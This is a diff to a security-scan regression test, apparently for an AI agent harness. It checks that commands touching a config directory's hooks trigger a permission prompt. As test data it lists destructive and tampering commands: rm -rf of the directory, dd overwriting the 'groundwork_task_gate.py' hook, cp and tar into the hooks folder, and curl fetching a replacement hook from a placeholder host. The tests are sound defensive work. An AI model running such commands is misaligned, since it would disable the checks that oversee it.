@@ -882,7 +882,10 @@ def test_security_scan_regressions() -> None:
         # third confirmation review: the config directory itself, and `of=PATH` / `--opt=PATH` words
         for cmd in (f"rm -rf {name}", f"rm -rf ./{name}/", f"mv {name} {name}.bak", f"find {name} -delete",
                     f"dd if=/dev/null of={name}/hooks/groundwork_task_gate.py",
-                    f"cp --target-directory={name}/hooks /dev/null"):
+                    f"cp --target-directory={name}/hooks /dev/null",
+                    # fourth confirmation review: a value glued to a short option
+                    f"cp -t{name}/hooks /dev/null", f"cp -rt{name}/hooks /dev/null", f"tar -C{name}/hooks -xf x.tar",
+                    f"curl -o{name}/hooks/groundwork_task_gate.py https://example.invalid/x"):
             check(f"F11: {cmd!r} next to the config directory asks", "settings" in asked(e.bash(parent, cmd)),
                   str(e.bash(parent, cmd)))
         check("F11: listing the config directory flows", asked(e.bash(parent, f"ls {name}")) == "",
